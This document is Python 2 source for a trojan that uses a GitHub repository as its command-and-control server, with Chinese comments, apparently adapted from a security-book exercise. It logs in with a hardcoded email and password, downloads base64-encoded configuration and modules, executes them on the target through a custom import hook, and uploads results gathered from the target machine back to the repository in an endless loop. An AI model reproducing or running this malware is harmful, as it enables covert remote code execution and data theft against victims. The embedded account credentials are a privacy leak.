import json
import base64
import time
import sys
import imp
import random
import threading
import Queue
import os

from github3 import login

trojan_id='abc'

trojan_config='%s.json'%trojan_id
data_path='data/%s/'%trojan_id
trojan_modules=[]
configured=False
task_queue=Queue.Queue()
usnm='937325203@qq.com'
pwd='Aheadboy.369'

#连接gethub
def connect_to_github():
    gh=login(username=usnm,password=pwd)
    repo=gh.repository(owner=usnm,repository='chapter7')
    branch=repo.branch('master')

    return gh,repo,branch

#从远程repo抓取文件
def get_file_contents(filepath):

    gh,repo,branch = connect_to_github()
    tree=branch.commit.commit.tree.recurse()

    for filename in tree.tree:

        if filepath in filename.path:
            print "[*] Found file %s"%filename.path
            blob=repo.blob(filename.sha)
            return blob.content

    return None

#获取远程配置文件
def get_trojan_config():
    global configured
    config_json=get_file_contents(trojan_config)
    config=json.loads(base64.b64decode(config_json))
    configured=True

    for task in config:
        if task['module'] not in sys.modules:

            exec('import %s'% task['module'])

    return config

#将从目标机收集的数据推送到repo中
def store_module_resule(data):
    gh,repo,branch=connect_to_github()
    remote_path='data/%s/%d.data' % (trojan_id,random.randint(1000,100000))
    repo.create_file(remote_path,'Commit message',base64.b64encode(data))
    return

class GitImporter(object):
    def __init__(self):
        self.current_module_code=''

    def find_module(self, fullname, path=None):

        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self

        return None

    def load_module(self,name):

        module=imp.new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name]=module

        return module

def module_runner(module):

    task_queue.put(1)
    result=sys.modules[module].run()
    task_queue.get()

    #将木马的运行结果反推到repo中
    store_module_resule(result)

    return

#木马的主循环
sys.meta_path=[GitImporter()]

while True:
    if task_queue.empty():

        config=get_trojan_config()
        for tesk in config :
            t=threading.Thread(target=module_runner,args=(tesk['module'],))
            t.start()
            time.sleep(random.randint(1,10))


    time.sleep(random.randint(1000,10000))



















